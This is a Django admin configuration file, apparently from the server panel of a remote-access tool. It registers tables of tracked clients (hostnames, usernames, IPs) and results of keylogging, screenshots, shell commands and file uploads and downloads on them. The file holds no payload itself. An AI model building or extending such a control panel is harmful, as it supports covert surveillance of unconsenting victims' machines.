#-*- coding: utf-8 -*-
from django.contrib import admin
from serviceapp.models import *

# Register your models here.

#+++++++++++++++++++++++++++++++++++++
class ContinentAdmin(admin.ModelAdmin):
    list_display = ('nom',)
    search_fields = ('nom',)#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class PaysAdmin(admin.ModelAdmin):
    list_display = ('nom','continent')
    search_fields = ('nom',)#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class IpAdresseAdmin(admin.ModelAdmin):
    list_display = ('id_ip','ip_locale','ip_recue','ip_inter')
    search_fields = ('id_ip','ip_locale','ip_recue','ip_inter')#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class TypeCommandeAdmin(admin.ModelAdmin):
    list_display = ('nom',)
    search_fields = ('nom',)#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class CommandeAdmin(admin.ModelAdmin):
    list_display = ('id_cmd','type_cmd','titre','texte','date_ajout','date_debut','date_fin','duree','url','active')
    search_fields = ('id_cmd','titre')#champ de recherche
    list_filter = ('type_cmd',)

#+++++++++++++++++++++++++++++++++++++
class ClientAdmin(admin.ModelAdmin):
    list_display = ('id_client', 'pays','ipadresse','hostname','USERNAME','dateajout','actif','connecte','src','vue','date_der_acces')
    search_fields = ('id_client','USERNAME', 'hostname')#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class ClientCommandeAdmin(admin.ModelAdmin):
    list_display = ('client', 'commande','executee','date_affectation')
    search_fields = ('date_affectation','executee')#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class KeyLoggerExecutionAdmin(admin.ModelAdmin):
    list_display = ('id_ae', 'date_insertion_ae','vue','client_commande_ae','text_ke')
    search_fields = ('id_ae','date_insertion_ae','text_ke')#champ de recherche

#+++++++++++++++++++++++++++++++++++++
class ScreenShotExecutionAdmin(admin.ModelAdmin):
    list_display = ('id_ae', 'date_insertion_ae','vue','client_commande_ae','img_sse')
    search_fields = ('id_ae','date_insertion_ae')#champ de recherche
    list_filter = ('client_commande_ae',)

#+++++++++++++++++++++++++++++++++++++
class ShellExecutionAdmin(admin.ModelAdmin):
    list_display = ('id_ae', 'date_insertion_ae','vue','client_commande_ae','resultats')
    search_fields = ('id_ae','date_insertion_ae')#champ de recherche
    list_filter = ('client_commande_ae',)

#+++++++++++++++++++++++++++++++++++++
class UploadExecutionAdmin(admin.ModelAdmin):
    list_display = ('id_ae', 'date_insertion_ae','vue','client_commande_ae','fichier','results')
    search_fields = ('id_ae','date_insertion_ae')#champ de recherche
    list_filter = ('client_commande_ae',)

#+++++++++++++++++++++++++++++++++++++
class DownloadExecutionAdmin(admin.ModelAdmin):
    list_display = ('id_ae', 'date_insertion_ae','vue','client_commande_ae','emplacement','results')
    search_fields = ('id_ae','date_insertion_ae')#champ de recherche
    list_filter = ('client_commande_ae',)

#===============Enregistrer les models admin=====================
admin.site.register(Continent, ContinentAdmin)
admin.site.register(Pays, PaysAdmin)
admin.site.register(IpAdresse, IpAdresseAdmin)
admin.site.register(TypeCommande, TypeCommandeAdmin)
admin.site.register(Commande, CommandeAdmin)
admin.site.register(Client, ClientAdmin)
admin.site.register(ClientCommande, ClientCommandeAdmin)
admin.site.register(KeyLoggerExecution, KeyLoggerExecutionAdmin)
admin.site.register(ScreenShotExecution, ScreenShotExecutionAdmin)
admin.site.register(ShellExecution, ShellExecutionAdmin)
admin.site.register(UploadExecution, UploadExecutionAdmin)
admin.site.register(DownloadExecution, DownloadExecutionAdmin)
# registrer toutes les models ....
